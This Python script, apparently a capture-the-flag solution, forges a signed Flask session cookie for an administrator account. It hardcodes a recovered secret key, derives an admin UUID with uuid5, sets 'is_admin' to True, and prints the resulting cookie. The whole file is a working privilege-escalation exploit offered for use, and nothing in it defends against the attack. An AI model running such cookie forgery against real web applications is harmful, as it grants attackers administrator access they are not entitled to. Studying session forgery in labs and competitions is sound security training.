from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import os
from datetime import datetime, timedelta
import hashlib

#  
app = Flask(__name__)
server_start_time = datetime(2024, 9, 21, 10, 39, 15)
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
# Generate hash with server start time
secure_key = "5366f780393b7cdddfc817fab3cbfbbbb6078c3952733a569d586c0089b2a1f0"
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)


# Import flask cookie encoder
from itsdangerous import URLSafeTimedSerializer
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
# Take the admin id and translate it into UUID



app = Flask(__name__)


# Set the known secret key (this should be the same as the one used by the Flask app)
app.secret_key = '5366f780393b7cdddfc817fab3cbfbbbb6078c3952733a569d586c0089b2a1f0'
# Take the secret from the date and hour of the server based on the start time

# Create a serializer for generating a cookie
def create_signed_cookie(data, secret_key):
    # Create a serializer using the secret key
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# Example of generating a fake session cookie


uid = uuid.uuid5(secret, 'administrator')


print("uid : ", uid)

# Example of generating a fake session cookie
with app.app_context():
    # uid = uuid.uuid5(secret, 'administrator')
    uid_admin = uuid.uuid5(secret, 'administrator')
    fake_session_data = {'is_admin': True, "uid": str(uid),'username': 'administrator'}
    fake_cookie = create_signed_cookie(fake_session_data, app.secret_key)
    print("Fake cookie:", fake_cookie)

# Create cookie and check it with https://www.kirsle.net/wizards/flask-session.cgi
